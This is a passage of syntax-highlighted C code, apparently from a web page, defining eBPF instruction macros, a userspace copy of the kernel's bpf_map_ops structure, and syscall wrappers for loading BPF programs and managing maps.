</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(OP) | BPF_K, DST, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, OFF, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_JMP32_IMM</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">OP</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">DST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">IMM</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">OFF</span><span style="color:#c0c5ce;">)                \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP32 | </span><span style="color:#8fa1b3;">BPF_OP</span><span style="color:#c0c5ce;">(OP) | BPF_K, DST, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, OFF, IMM)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()                                 \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | BPF_EXIT, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">__dst_reg</span><span style="color:#c0c5ce;">)                   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* get a pointer to bpf_array */                </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LD_MAP_FD</span><span style="color:#c0c5ce;">(BPF_REG_9, __map_fd),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_1, BPF_REG_9),            \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_2, BPF_REG_10),           \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_2, -</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ST_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_2, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __idx),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | BPF_CALL, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, BPF_FUNC_map_lookup_elem), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* if success, r0 will be ptr to value, 0 for failed */              </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_JMP_IMM</span><span style="color:#c0c5ce;">(BPF_JNE, BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">(),                                \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* mov the result back and clear R0 */          </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(__dst_reg, BPF_REG_0),            \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#ifndef</span><span style="color:#c0c5ce;"> __user
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">__user 
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#ifndef</span><span style="color:#c0c5ce;"> __rcu
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">__rcu 
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_map;
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf;
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf_type;
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_prog;
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_prog_aux;
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">poll_table_struct;
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">vm_area_struct;
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_local_storage_map;
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* map is generic key/value storage optionally accesible by eBPF programs */
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_map_ops {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* funcs callable from userspace (via syscall) */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_alloc_check)(</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr *attr);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_map *(*map_alloc)(</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">bpf_attr *attr);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*map_release)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *map_file);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*map_free)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_get_next_key)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*key, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*next_key);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*map_release_uref)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*(*map_lookup_elem_sys_only)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*key);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_lookup_batch)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">const union</span><span style="color:#c0c5ce;"> bpf_attr *attr,
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr __user *uattr);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_lookup_and_delete_batch)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map,
</span><span style="color:#c0c5ce;">					   </span><span style="color:#b48ead;">const union</span><span style="color:#c0c5ce;"> bpf_attr *attr,
</span><span style="color:#c0c5ce;">					   </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr __user *uattr);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_update_batch)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">const union</span><span style="color:#c0c5ce;"> bpf_attr *attr,
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr __user *uattr);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_delete_batch)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">const union</span><span style="color:#c0c5ce;"> bpf_attr *attr,
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr __user *uattr);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* funcs callable from userspace and from eBPF programs */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*(*map_lookup_elem)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*key);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_update_elem)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*key, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*value, 
</span><span style="color:#c0c5ce;">        		       uint64_t flags);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_delete_elem)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*key);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_push_elem)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*value, uint64_t flags);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_pop_elem)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*value);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_peek_elem)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*value);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* funcs called by prog_array and perf_event_array map */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*(*map_fd_get_ptr)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *map_file,
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*map_fd_put_ptr)(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ptr);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_gen_lookup)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn *insn_buf);
</span><span style="color:#c0c5ce;">	uint32_t (*map_fd_sys_lookup_elem)(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ptr);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*map_seq_show_elem)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*key,
</span><span style="color:#c0c5ce;">				  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> seq_file *m);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_check_btf)(</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map *map,
</span><span style="color:#c0c5ce;">			     </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> btf *btf,
</span><span style="color:#c0c5ce;">			     </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> btf_type *key_type,
</span><span style="color:#c0c5ce;">			     </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> btf_type *value_type);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Prog poke tracking helpers. */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_poke_track)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_prog_aux *aux);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*map_poke_untrack)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_prog_aux *aux);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*map_poke_run)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, uint32_t key, 
</span><span style="color:#c0c5ce;">			     </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_prog *old, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_prog *new);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Direct value access helpers. */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_direct_value_addr)(</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map *map,
</span><span style="color:#c0c5ce;">				     uint64_t *imm, uint32_t off);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_direct_value_meta)(</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map *map,
</span><span style="color:#c0c5ce;">				     uint64_t imm, uint32_t *off);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_mmap)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> vm_area_struct *vma);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__poll_t </span><span style="color:#c0c5ce;">(*map_poll)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *map, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *filp,
</span><span style="color:#c0c5ce;">			     </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> poll_table_struct *pts);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Functions called by bpf_local_storage maps */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_local_storage_charge)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_local_storage_map *smap,
</span><span style="color:#c0c5ce;">					</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*owner, uint32_t size);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*map_local_storage_uncharge)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_local_storage_map *smap,
</span><span style="color:#c0c5ce;">					   </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*owner, uint32_t size);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_local_storage __rcu ** (*map_owner_storage_ptr)(void *owner);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* map_meta_equal must be implemented for maps that can be
</span><span style="color:#65737e;">	 * used as an inner map.  It is a runtime check to ensure
</span><span style="color:#65737e;">	 * an inner map can be inserted to an outer map.
</span><span style="color:#65737e;">	 *
</span><span style="color:#65737e;">	 * Some properties of the inner map has been used during the
</span><span style="color:#65737e;">	 * verification time.  When inserting an inner map at the runtime,
</span><span style="color:#65737e;">	 * map_meta_equal has to ensure the inserting map has the same
</span><span style="color:#65737e;">	 * properties that the verifier has used earlier.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*map_meta_equal)(</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map *meta0,
</span><span style="color:#c0c5ce;">			      </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map *meta1);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* BTF name and id of struct allocated by map_alloc */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">* </span><span style="color:#b48ead;">const</span><span style="color:#c0c5ce;"> map_btf_name;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">*map_btf_id;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* bpf_iter info used to open a seq_file */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">const struct </span><span style="color:#c0c5ce;">bpf_iter_seq_info *iter_seq_info;
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_bpf, cmd, attr, sizeof(*attr));
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_load_prog</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">prog_type</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn *</span><span style="color:#bf616a;">insns</span><span style="color:#c0c5ce;">, uint64_t </span><span style="color:#bf616a;">insn_cnt</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">              </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">log_buf</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">log_buf_sz</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">log_level</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">prog_type </span><span style="color:#c0c5ce;">= prog_type,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">insns </span><span style="color:#c0c5ce;">= (uint64_t) insns,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">insn_cnt </span><span style="color:#c0c5ce;">= insn_cnt,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">license </span><span style="color:#c0c5ce;">= (uint64_t) &quot;</span><span style="color:#a3be8c;">GPL</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">log_level </span><span style="color:#c0c5ce;">= log_level,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">log_buf </span><span style="color:#c0c5ce;">= (uint64_t) log_buf,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">log_size </span><span style="color:#c0c5ce;">= log_buf_sz,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_PROG_LOAD, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_create</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">map_type</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">key_size</span><span style="color:#c0c5ce;">, 
</span><span style="color:#c0c5ce;">               </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">value_size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">max_entries</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_type </span><span style="color:#c0c5ce;">= map_type,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key_size </span><span style="color:#c0c5ce;">= key_size,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value_size </span><span style="color:#c0c5ce;">= value_size,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">max_entries </span><span style="color:#c0c5ce;">= max_entries,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_CREATE, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_lookup_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">= (uint64_t) value,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_LOOKUP_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">,</span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">,</span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">,uint64_t </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">= (uint64_t) value,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">flags </span><span style="color:#c0c5ce;">= flags,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_UPDATE_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_delete_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_DELETE_ELEM, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static</span><span style="color:#c0c5ce;"> __always_inline </span><span style="color:#b48ead;">int
</span><span style="color:#8fa1b3;">bpf_map_get_next_key</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr attr = {
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">map_fd </span><span style="color:#c0c5ce;">= map_fd,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= (uint64_t) key,
</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">next_key </span><span style="color:#c0c5ce;">= (uint64_t) value,
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">
